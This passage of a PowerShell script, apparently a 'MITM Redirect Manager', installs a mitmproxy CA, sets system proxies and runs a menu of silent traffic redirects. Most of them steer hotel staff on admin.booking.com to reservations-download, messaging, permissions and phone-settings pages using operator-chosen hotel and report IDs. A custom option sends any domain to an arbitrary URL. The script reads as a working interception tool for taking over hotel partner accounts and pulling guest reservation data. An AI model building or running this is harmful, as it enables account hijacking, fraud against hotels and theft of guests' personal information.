    Log-Write ("Custom one-time redirect configured: {0} -> {1}" -f $fromDomain, $toDomain)
    Write-Host ""
    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) -ForegroundColor Green
    Write-Host ("           will redirect to: {0}" -f $toDomain) -ForegroundColor Green
    Write-Host ("Function will auto-disable after first use") -ForegroundColor Yellow
    Write-Host ""
    
    # Create activation flag
    if (-not (Test-Path (Split-Path $CustomRedirectFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $CustomRedirectFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $CustomRedirectFlag -Force | Out-Null
    
    # Disable other flags
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    
    Start-Mitmdump
    
    Log-Write "Custom one-time redirect enabled (function 17). First matching request will be redirected."
}

function Enable-BookingReservationsRedirect {
    Log-Write "Starting Booking Reservations Download Redirect (function 18)..."
    
    Write-Host ""
    Write-Host "=== BOOKING RESERVATIONS DOWNLOAD REDIRECT (FUNCTION 18) ==="
    Write-Host ""
    Write-Host "Redirects all requests to admin.booking.com/hotel/ to reservations download page"
    Write-Host "Until the target page with ses parameter is requested"
    Write-Host ""
    
    # Get hotel_id from admin
    do {
        $hotelId = Read-Host "Enter hotel_id (example: 14762911)"
        if ($hotelId -notmatch '^\d+$') {
            Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    # Get reportId from admin
    do {
        $reportId = Read-Host "Enter reportId (example: 5865185)"
        if ($reportId -notmatch '^\d+$') {
            Write-Host "ERROR: reportId must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    # Save parameters to files
    Set-Content -Path $BookingReservationsHotelIdFile -Value $hotelId -Force
    Set-Content -Path $BookingReservationsReportIdFile -Value $reportId -Force
    
    # Create activation flag
    if (-not (Test-Path (Split-Path $BookingReservationsFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingReservationsFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingReservationsFlag -Force | Out-Null
    
    # Disable other flags
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    
    Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
    Write-Host ""
    Write-Host ("[CONFIGURED] All requests to admin.booking.com/hotel/ will be redirected to:") -ForegroundColor Green
    Write-Host ("   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html") -ForegroundColor Green
    Write-Host ("   with parameters: hotel_id={0}&lang=&reportId={1}" -f $hotelId, $reportId) -ForegroundColor Green
    Write-Host ""
    Write-Host ("Redirect will stop when user requests:") -ForegroundColor Yellow
    Write-Host ("   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html") -ForegroundColor Yellow
    Write-Host ("   with ses parameter (any value)") -ForegroundColor Yellow
    Write-Host ""
    
    Start-Mitmdump
    
    Log-Write "Booking reservations download redirect enabled (function 18)."
}

# ---------------- MAIN ----------------
Ensure-WorkDir
Log-Write "MITM Manager starting."

# Reset all
Reset-Proxy-And-Stop-Mitmdump
Clear-SystemProxies

# Ensure CA installed
Ensure-MitmCA | Out-Null

# Ask user for redirect URL
$redirectURL = Read-Host "Enter the URL to redirect clients to (include https://)"
Set-Content -Path $RedirectFile -Value $redirectURL -Force
Log-Write ("Target URL saved to {0}" -f $RedirectFile)

# Ask user about browser closing
Write-Host "`nChoose browser closing option:"
Write-Host "1) Full close (close all browser windows completely)"
Write-Host "2) Graceful close (try to close gracefully, keep if user cancels)"
Write-Host "3) Don't close browsers"
$closeChoice = Read-Host "Choose option (1-3)"

$closeOption = switch ($closeChoice) {
    "1" { "full" }
    "2" { "graceful" }
    "3" { "none" }
    default { "graceful" }
}

Close-Browsers-Gracefully -closeOption $closeOption

# Function menu
while ($true) {
    Write-Host ""
    Write-Host "--------------- MITM Redirect Manager ---------------"
    Write-Host "1) RESET"
    Write-Host "2) one-shot"
    Write-Host "3) force"
    Write-Host "4) disable"
    Write-Host "5) tail log"
    Write-Host "6) EXIT"
    Write-Host "7) Messaging"
    Write-Host "8) Provider"
    Write-Host "9) User"
    Write-Host "10) Phone"
    Write-Host "11) Enable Operation 11 (function 7 -> messaging/settings -> function 8)"
    Write-Host "12) Enable Operation 12 (function 9 -> accounts_and_permissions -> function 10)"
    Write-Host "13) Phone settings force"
    Write-Host "14) Problem gap"
    Write-Host "15) Messages settings force"
    Write-Host "16) Combo Operation 16 (function 13 -> function 15)"
    Write-Host "17) Custom One-Time shot (select source -> target)"
    Write-Host "18) Booking Reservations Download (Function 18)"
    $opt = Read-Host "Choose option (1-18)"

    switch ($opt) {
        "1" {
            Reset-Proxy-And-Stop-Mitmdump;
            Clear-SystemProxies | Out-Null;
            Log-Write "Full reset performed."
        }
        "2" { Enable-OneShotRedirect }
        "3" { Enable-ForceRedirect }
        "4" {
            Remove-Item -Path $ForceFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $OneShotFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $MessageFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $ProviderFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $UserFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $SecurityFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $Operation11Flag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $Operation12Flag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $Operation16Flag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectFromFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectDoneFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingReservationsFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingReservationsHotelIdFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingReservationsReportIdFile -Force -ErrorAction SilentlyContinue
            Clear-SystemProxies | Out-Null
            Reset-Proxy-And-Stop-Mitmdump
            Log-Write "Redirects disabled and proxy cleared."
        }
        "5" {
            if (Test-Path $LogFile) {
                Get-Content -Path $LogFile -Tail 200 -Wait
            } else {
                Write-Host "Log not found."
            }
        }
        "6" { Safe-Exit }
        "7" { Enable-MessageRedirect }
        "8" { Enable-ProviderRedirect }
        "9" { Enable-UserRedirect }
        "10" { Enable-SecurityRedirect }
        "11" { Enable-Operation11Redirect }
        "12" { Enable-Operation12Redirect }
        "13" { Enable-BookingHotelRedirect }
        "14" { Disable-BookingHotelRedirect }
        "15" { Enable-BookingHotelSecurityRedirect }
        "16" { Enable-Operation16Redirect }
        "17" { Enable-CustomRedirect }
        "18" { Enable-BookingReservationsRedirect }
        default { Write-Host "Invalid choice" }
    }
}
